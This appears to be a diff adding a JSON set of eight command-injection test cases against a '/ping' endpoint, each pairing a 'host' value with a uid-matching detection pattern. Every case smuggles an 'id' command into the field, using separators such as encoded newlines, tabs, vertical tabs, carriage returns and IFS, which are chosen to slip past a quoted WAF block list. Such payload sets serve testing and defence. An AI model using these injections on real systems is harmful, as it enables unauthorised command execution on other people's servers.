@@ -1,0 +1,82 @@
+[
+  {
+    "id": "dyn_cmd_1",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1%0a id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "URL-encoded newline to inject id command after ping"
+  },
+  {
+    "id": "dyn_cmd_2",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\tid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Tab character as command separator (not in WAF block list)"
+  },
+  {
+    "id": "dyn_cmd_3",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1 -c 1 -W 1 && id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Space-separated args with && — checking if && is blocked or only | ; & individually"
+  },
+  {
+    "id": "dyn_cmd_4",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1{IFS}id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "IFS substitution without dollar sign to avoid WAF"
+  },
+  {
+    "id": "dyn_cmd_5",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1 -c 0 id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Abuse ping argument parsing to inject id as a host"
+  },
+  {
+    "id": "dyn_cmd_6",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1%20-c%201%3B%20id"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "URL-encoded semicolon and space to inject id after ping"
+  },
+  {
+    "id": "dyn_cmd_7",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "x -c 0 -W 0 2>/dev/null\u000bid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Vertical tab (\\v, 0x0B) as command separator — not in WAF block list [;&|`$()\\n]"
+  },
+  {
+    "id": "dyn_cmd_8",
+    "endpoint": "/ping",
+    "method": "POST",
+    "params": {
+      "host": "127.0.0.1\rid"
+    },
+    "detect_pattern": "uid=[0-9]+\\(",
+    "technique": "Carriage return (\\r) as line separator — WAF blocks \\n but may not block \\r"
+  }
+]
